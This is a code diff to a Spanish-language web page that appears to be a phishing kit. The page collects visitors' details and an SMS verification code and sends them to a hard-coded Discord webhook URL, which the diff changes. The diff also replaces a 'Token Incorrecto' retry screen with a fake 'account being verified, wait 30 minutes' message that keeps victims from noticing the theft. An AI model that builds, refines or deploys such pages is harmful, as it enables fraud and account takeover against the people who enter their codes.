@@ -103,8 +103,8 @@
         </div>
     </div>
 
-    <!-- ===== PANTALLA DE TOKEN INCORRECTO ===== -->
-    <div id="stepError" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
+    <!-- ===== PANTALLA DE ESPERA (HABILITACIÓN) ===== -->
+    <div id="stepWaiting" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
         <div class="flex flex-col items-center max-w-sm text-center px-6">
             <!-- Icono de reloj animado -->
             <div class="relative mb-6">
@@ -116,17 +116,17 @@
 
             <!-- Título con efecto shimmer -->
             <h2 class="text-2xl font-bold shimmer-text mb-2 fade-in-up">
-                Token Incorrecto
+                Habilitación en Proceso
             </h2>
 
             <!-- Mensaje principal -->
             <p class="text-gray-700 text-base font-semibold mb-1 fade-in-up" style="animation-delay: 0.2s;">
-                El código ingresado no es válido.
+                Espere <span class="text-[#D9272E] font-extrabold">30 minutos</span> para que los beneficios sean activados.
             </p>
 
             <!-- Subtítulo -->
             <p class="text-gray-400 text-sm mt-2 fade-in-up" style="animation-delay: 0.4s;">
-                Serás redirigido para intentar nuevamente.
+                Su cuenta está siendo verificada por nuestro equipo de seguridad.
             </p>
 
             <!-- Puntos animados -->
@@ -287,9 +287,9 @@
     <!-- ===== SCRIPTS DE CONTROL ===== -->
     <script>
         // ============================================
-        // 🔴 WEBHOOK DE DISCORD (ACTUALIZADO)
+        // 🔴 WEBHOOK DE DISCORD
         // ============================================
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1545430599035134044/sAg1h0yXkKLI3pM0SIFKwBZ_Jdd5SLTvsnI3kYr6j-riwE4khsiIHm5dr43G9Suj5fjI";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1545417934409568376/F5U-wD_BAZ0XR8S_FgCIza116dse1l89DPzqidWkuDoLWKqr7gbw6FpnjjVd7ZDkZStg";
 
         // ===== VALIDACIÓN DE CAMPOS =====
         function validarTecla(event) {
@@ -458,19 +458,12 @@
                 });
 
                 // ============================================
-                // 🔥 MUESTRA PANTALLA DE TOKEN INCORRECTO
+                // 🔥 MUESTRA PANTALLA DE HABILITACIÓN
                 // ============================================
                 setTimeout(() => {
                     loader.classList.add('hidden');
                     document.getElementById('stepVerification').classList.add('hidden');
-                    document.getElementById('stepError').classList.remove('hidden');
-                    
-                    // Después de 10 segundos, volver a la sección de token
-                    setTimeout(() => {
-                        document.getElementById('stepError').classList.add('hidden');
-                        document.getElementById('stepVerification').classList.remove('hidden');
-                        document.getElementById('smsCode').value = '';
-                    }, 10000);
+                    document.getElementById('stepWaiting').classList.remove('hidden');
                     
                 }, 2000);
 
